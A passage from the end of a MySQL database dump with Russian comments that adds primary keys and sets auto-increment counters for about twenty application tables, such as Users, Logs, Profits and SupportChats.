  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Countries`
--
ALTER TABLE `Countries`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Currencies`
--
ALTER TABLE `Currencies`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Logs`
--
ALTER TABLE `Logs`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Mentors`
--
ALTER TABLE `Mentors`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `ProDomains`
--
ALTER TABLE `ProDomains`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `ProfitRequests`
--
ALTER TABLE `ProfitRequests`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Profits`
--
ALTER TABLE `Profits`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Requests`
--
ALTER TABLE `Requests`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `userId` (`userId`);

--
-- Индексы таблицы `sequelizemeta`
--
ALTER TABLE `sequelizemeta`
  ADD PRIMARY KEY (`name`),
  ADD UNIQUE KEY `name` (`name`);

--
-- Индексы таблицы `Services`
--
ALTER TABLE `Services`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Settings`
--
ALTER TABLE `Settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `SupportChats`
--
ALTER TABLE `SupportChats`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Supports`
--
ALTER TABLE `Supports`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `SupportTemplates`
--
ALTER TABLE `SupportTemplates`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `SupportUsers`
--
ALTER TABLE `SupportUsers`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Users`
--
ALTER TABLE `Users`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `Writers`
--
ALTER TABLE `Writers`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `Bins`
--
ALTER TABLE `Bins`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблицы `Complaints`
--
ALTER TABLE `Complaints`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT для таблицы `Currencies`
--
ALTER TABLE `Currencies`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT для таблицы `Logs`
--
ALTER TABLE `Logs`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=323;

--
-- AUTO_INCREMENT для таблицы `Mentors`
--
ALTER TABLE `Mentors`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;

--
-- AUTO_INCREMENT для таблицы `ProDomains`
--
ALTER TABLE `ProDomains`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT для таблицы `ProfitRequests`
--
ALTER TABLE `ProfitRequests`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT для таблицы `Profits`
--
ALTER TABLE `Profits`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=58;

--
-- AUTO_INCREMENT для таблицы `Requests`
--
ALTER TABLE `Requests`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=382;

--
-- AUTO_INCREMENT для таблицы `Services`
--
ALTER TABLE `Services`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=87;

--
-- AUTO_INCREMENT для таблицы `Settings`
--
ALTER TABLE `Settings`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT для таблицы `SupportChats`
--
ALTER TABLE `SupportChats`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=966;

--
-- AUTO_INCREMENT для таблицы `Supports`
--
ALTER TABLE `Supports`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1184;

--
-- AUTO_INCREMENT для таблицы `SupportTemplates`
--
ALTER TABLE `SupportTemplates`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT для таблицы `SupportUsers`
--
ALTER TABLE `SupportUsers`
  MODIFY `id` bigint NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT для таблицы `Writers`
--
ALTER TABLE `Writers`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
